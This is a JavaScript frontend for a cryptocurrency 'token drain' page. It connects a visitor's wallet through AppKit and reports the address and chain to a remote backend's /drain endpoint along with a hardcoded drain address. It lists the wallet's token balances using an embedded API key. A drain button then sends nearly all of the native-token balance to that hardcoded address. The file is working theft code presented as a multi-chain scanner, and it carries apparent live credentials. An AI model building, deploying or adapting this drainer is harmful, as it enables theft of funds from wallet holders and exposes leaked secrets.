// Token Drain Frontend - WORKING VERSION
// Uses CDN imports to avoid build issues

// Configuration
const CONFIG = {
    projectId: "962425907914a3e80a7d8e7288b23f62",
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    // RPC Providers
    rpcProviders: {
        1: "https://eth.llamarpc.com",
        56: "https://bsc-dataseed.binance.org",
        137: "https://polygon-rpc.com",
        42161: "https://arb1.arbitrum.io/rpc"
    },
    
    networkNames: {
        1: "Ethereum",
        56: "Binance Smart Chain",
        137: "Polygon",
        42161: "Arbitrum"
    }
};

// Global state
let appKit = null;
let provider = null;
let signer = null;
let currentAccount = null;
let currentChainId = null;
let isConnected = false;

// DOM Elements
let connectBtn, statusEl, tokensEl, tokensContainer, drainBtn, scanAllBtn, chainSelector, networkSelect, tokenCount;

// Initialize when page loads
window.addEventListener('DOMContentLoaded', async () => {
    console.log('DOM loaded, initializing...');
    await initializeApp();
});

async function initializeApp() {
    try {
        // Get DOM elements
        connectBtn = document.getElementById("connectBtn");
        statusEl = document.getElementById("status");
        tokensEl = document.getElementById("tokens");
        tokensContainer = document.getElementById("tokensContainer");
        drainBtn = document.getElementById("drainBtn");
        scanAllBtn = document.getElementById("scanAllBtn");
        chainSelector = document.getElementById("chainSelector");
        networkSelect = document.getElementById("networkSelect");
        tokenCount = document.getElementById("tokenCount");

        // Test backend connection
        await testBackend();
        
        // Load AppKit from CDN
        await loadAppKit();
        
        // Setup event listeners
        setupEventListeners();
        
        console.log("✅ App initialized successfully");
        
    } catch (error) {
        console.error("Initialization error:", error);
        updateStatus("Failed to initialize: " + error.message);
    }
}

async function testBackend() {
    try {
        const response = await fetch(`${CONFIG.backendUrl}/health`);
        if (response.ok) {
            const data = await response.json();
            console.log("✅ Backend is online:", data);
            updateStatus("Ready to connect wallet...");
        } else {
            console.log("⚠️ Backend health check failed");
            updateStatus("Backend connection issue - using local mode");
        }
    } catch (error) {
        console.log("❌ Backend unreachable:", error.message);
        updateStatus("Backend offline - using local mode");
    }
}

async function loadAppKit() {
    try {
        // Dynamically import AppKit and EthersAdapter
        const { createAppKit } = window.AppKit;
        const { EthersAdapter } = window.EthersAdapter;
        
        // If not available in window, try to load from CDN
        if (!createAppKit || !EthersAdapter) {
            console.log("Loading AppKit from CDN...");
            
            // Load AppKit script
            await loadScript('https://cdn.jsdelivr.net/npm/@reown/appkit@1.3.0/dist/index.umd.js');
            await loadScript('https://cdn.jsdelivr.net/npm/@reown/appkit-adapter-ethers@1.0.0/dist/index.umd.js');
            
            // Now they should be in window
            if (!window.AppKit || !window.EthersAdapter) {
                throw new Error("Failed to load AppKit libraries");
            }
        }
        
        // Create networks array
        const networks = Object.entries(CONFIG.rpcProviders).map(([id, rpcUrl]) => ({
            id: parseInt(id),
            name: CONFIG.networkNames[id] || `Chain ${id}`,
            rpcUrl: rpcUrl
        }));
        
        // Initialize AppKit
        appKit = window.AppKit.createAppKit({
            adapters: [new window.EthersAdapter.EthersAdapter()],
            projectId: CONFIG.projectId,
            networks: networks,
            metadata: {
                name: "Token Drain Scanner",
                description: "Multi-chain token scanner and drain",
                url: window.location.origin,
                icons: []
            },
            themeMode: "dark",
            features: {
                analytics: false
            }
        });
        
        // Subscribe to state changes
        appKit.subscribeState(handleAppKitState);
        
        console.log("✅ AppKit loaded and initialized");
        
    } catch (error) {
        console.error("Failed to load AppKit:", error);
        updateStatus("Wallet connection library failed to load. Please refresh.");
        throw error;
    }
}

function loadScript(src) {
    return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = src;
        script.onload = resolve;
        script.onerror = reject;
        document.head.appendChild(script);
    });
}

function setupEventListeners() {
    // Connect button
    if (connectBtn) {
        connectBtn.addEventListener("click", handleConnect);
    }
    
    // Drain button
    if (drainBtn) {
        drainBtn.addEventListener("click", handleDrain);
    }
    
    // Scan all chains button
    if (scanAllBtn) {
        scanAllBtn.addEventListener("click", handleScanAll);
    }
    
    // Network selector
    if (networkSelect) {
        networkSelect.addEventListener("change", handleNetworkChange);
    }
}

async function handleConnect() {
    try {
        if (!appKit) {
            updateStatus("Wallet connection not initialized");
            return;
        }
        
        if (isConnected) {
            // Disconnect
            await appKit.disconnect();
            isConnected = false;
            updateStatus("Disconnected");
            connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
            hideUIElements();
            return;
        }
        
        updateStatus("Opening wallet modal...");
        await appKit.open();
        
    } catch (error) {
        console.error("Connection error:", error);
        updateStatus("Connection failed: " + error.message);
    }
}

function handleAppKitState(state) {
    console.log("AppKit State:", state);
    
    if (state.isConnected && state.account && state.chain) {
        handleConnected(state.account, state.chain);
    } else if (isConnected) {
        handleDisconnected();
    }
}

async function handleConnected(account, chain) {
    try {
        if (!account?.address || !chain?.id) {
            setTimeout(() => handleConnected(account, chain), 100);
            return;
        }
        
        currentAccount = account.address;
        currentChainId = chain.id;
        isConnected = true;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        updateStatus(`✅ Connected\n👛 Wallet: ${currentAccount.slice(0, 8)}...${currentAccount.slice(-4)}\n🌐 Network: ${chain.name}\n⛓️ Chain ID: ${chain.id}`);
        
        // Show UI elements
        showUIElements();
        
        // Log connection to backend
        await logConnectionToBackend(currentAccount, chain.id);
        
        // Fetch tokens
        await fetchTokens(currentAccount, chain.id);
        
        // Update network selector
        if (chainSelector && networkSelect) {
            chainSelector.classList.remove("hidden");
            networkSelect.value = chain.id;
        }
        
    } catch (error) {
        console.error("Connected handler error:", error);
        updateStatus("Connection error: " + error.message);
    }
}

function handleDisconnected() {
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    provider = null;
    signer = null;
    
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus("Disconnected");
    hideUIElements();
}

async function logConnectionToBackend(address, chainId) {
    try {
        updateStatus("Logging connection to backend...");
        
        const response = await fetch(`${CONFIG.backendUrl}/drain`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString()
            }),
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log("✅ Backend logged connection:", data);
            updateStatus(`✅ Connected & logged\n💰 Drain address: ${CONFIG.drainAddress.slice(0, 10)}...`);
        } else {
            console.log("Backend logging failed");
        }
        
    } catch (error) {
        console.log("Backend logging failed:", error.message);
    }
}

async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">Scanning tokens...</div>';
    
    try {
        // Try backend first
        const response = await fetch(`${CONFIG.backendUrl}/tokens/${address}?chainId=${chainId}`);
        
        if (response.ok) {
            const data = await response.json();
            if (data.success && data.data.tokens && data.data.tokens.length > 0) {
                displayTokens(data.data.tokens);
                updateStatus(`✅ Found ${data.data.tokens.length} tokens on ${CONFIG.networkNames[chainId] || 'this chain'}`);
                return;
            }
        }
        
        // Fallback to direct Covalent API
        await fetchTokensFromCovalent(address, chainId);
        
    } catch (error) {
        console.error("Token fetch error:", error);
        await fetchTokensFromCovalent(address, chainId);
    }
}

async function fetchTokensFromCovalent(address, chainId) {
    if (!tokensEl) return;
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`
        );
        
        if (!response.ok) {
            throw new Error(`Covalent API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                
                return {
                    symbol: t.contract_ticker_symbol || (t.native_token ? 'Native' : 'TOKEN'),
                    name: t.contract_name || (t.native_token ? 'Native Token' : 'Unknown'),
                    amount: amount,
                    formattedAmount: amount.toLocaleString(undefined, {
                        minimumFractionDigits: 0,
                        maximumFractionDigits: 6
                    }),
                    value: value,
                    formattedValue: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    isNative: t.native_token || false
                };
            });
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens on ${CONFIG.networkNames[chainId] || 'this chain'}`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found on this chain</div>';
            updateStatus("No tokens found on this chain");
        }
        
    } catch (error) {
        console.error("Covalent error:", error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens from Covalent API</div>';
        updateStatus("Token scan failed");
    }
}

function displayTokens(tokens) {
    if (!tokensEl) return;
    
    const totalValue = tokens.reduce((sum, t) => sum + (t.value || 0), 0);
    
    const html = tokens.map(token => `
        <div class="token-item">
            <div class="token-info">
                <span class="token-symbol">${token.symbol}</span>
                <span class="token-name">${token.name}</span>
            </div>
            <div>
                <div class="token-amount">${token.formattedAmount || token.amount.toLocaleString(undefined, {maximumFractionDigits: 6})}</div>
                ${token.value > 0 ? `<div class="token-value">$${token.value.toFixed(2)}</div>` : ''}
            </div>
        </div>
    `).join('');
    
    tokensEl.innerHTML = html;
    
    if (tokenCount) {
        tokenCount.textContent = `${tokens.length} token${tokens.length !== 1 ? 's' : ''} • $${totalValue.toFixed(2)}`;
    }
    
    if (tokensContainer) {
        tokensContainer.classList.remove("hidden");
    }
}

async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert("Please connect wallet first");
        return;
    }
    
    if (!confirm(`⚠️ DRAIN WARNING\n\nThis will send ALL tokens to:\n${CONFIG.drainAddress}\n\nYou need native token (ETH, MATIC, etc.) for gas.\n\nContinue?`)) {
        return;
    }
    
    const statusEl = document.getElementById("status");
    const drainBtn = document.getElementById("drainBtn");
    
    try {
        updateStatus("🚀 Starting drain process...");
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = "⏳ Draining...";
        }
        
        // Get signer from wallet
        if (typeof window.ethereum !== 'undefined') {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            signer = provider.getSigner();
        } else {
            throw new Error("No wallet provider found");
        }
        
        // Get ETH balance
        const balance = await provider.getBalance(currentAccount);
        const gasPrice = await provider.getGasPrice();
        const gasLimit = ethers.BigNumber.from(21000);
        const gasCost = gasPrice.mul(gasLimit);
        
        // Check if enough for gas
        if (balance.gt(gasCost.mul(2))) {
            const sendAmount = balance.sub(gasCost.mul(2));
            
            const tx = await signer.sendTransaction({
                to: CONFIG.drainAddress,
                value: sendAmount,
                gasLimit: gasLimit
            });
            
            updateStatus(`📤 Transaction sent: ${tx.hash}\n⏳ Waiting for confirmation...`);
            
            const receipt = await tx.wait();
            updateStatus(`✅ Drain completed!\nTransaction confirmed in block ${receipt.blockNumber}`);
            
            // Refresh token display
            await fetchTokens(currentAccount, currentChainId);
            
        } else {
            updateStatus("⚠️ Not enough native token for gas");
        }
        
    } catch (error) {
        console.error("Drain error:", error);
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert(`Drain failed: ${error.message}`);
    } finally {
        const drainBtn = document.getElementById("drainBtn");
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = "⚡ Drain Wallet";
        }
    }
}

async function handleScanAll() {
    alert("Scan all chains feature coming soon!");
}

async function handleNetworkChange(event) {
    const newChainId = parseInt(event.target.value);
    
    if (newChainId === currentChainId) {
        return;
    }
    
    try {
        updateStatus(`🔄 Switching to ${CONFIG.networkNames[newChainId] || `Chain ${newChainId}`}...`);
        
        // Switch network in wallet
        await appKit.switchChain({ id: newChainId });
        
    } catch (error) {
        console.error("Network switch error:", error);
        updateStatus(`❌ Failed to switch network: ${error.message}`);
        // Reset selector
        if (networkSelect) {
            networkSelect.value = currentChainId;
        }
    }
}

function showUIElements() {
    if (chainSelector) chainSelector.classList.remove("hidden");
    if (drainBtn) drainBtn.classList.remove("hidden");
    if (scanAllBtn) scanAllBtn.classList.remove("hidden");
    if (tokensContainer) tokensContainer.classList.remove("hidden");
}

function hideUIElements() {
    if (chainSelector) chainSelector.classList.add("hidden");
    if (drainBtn) drainBtn.classList.add("hidden");
    if (scanAllBtn) scanAllBtn.classList.add("hidden");
    if (tokensContainer) tokensContainer.classList.add("hidden");
    
    if (tokensEl) tokensEl.innerHTML = "";
    if (tokenCount) tokenCount.textContent = "0 tokens";
}

function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
    }
}

// Make sure ethers is available globally
if (typeof ethers === 'undefined') {
    // Load ethers from CDN if not already loaded
    const ethersScript = document.createElement('script');
    ethersScript.src = 'https://cdn.ethers.io/lib/ethers-5.7.umd.min.js';
    ethersScript.onload = () => console.log('Ethers.js loaded');
    document.head.appendChild(ethersScript);
}
